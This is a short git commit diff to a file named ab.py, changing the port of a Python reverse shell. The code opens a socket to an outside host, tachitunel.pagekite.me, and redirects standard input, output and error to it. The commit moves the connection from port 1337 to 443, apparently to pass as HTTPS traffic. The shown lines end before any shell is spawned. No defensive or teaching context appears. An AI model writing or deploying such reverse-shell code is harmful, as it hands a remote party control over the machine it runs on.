a5b224043f41bffef69fe8dcc2ec7037908ab989
Juan Mautone <juan.ignaciomautone@gmail.com>
2024-12-15 22:35:25 -0300

    Update ab.py

--- ab.py
+++ ab.py
@@ -1,6 +1,6 @@
 import socket, subprocess, os
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("tachitunel.pagekite.me", 1337)) 
+s.connect(("tachitunel.pagekite.me", 443)) 
 os.dup2(s.fileno(), 0)  
 os.dup2(s.fileno(), 1)  
 os.dup2(s.fileno(), 2)  
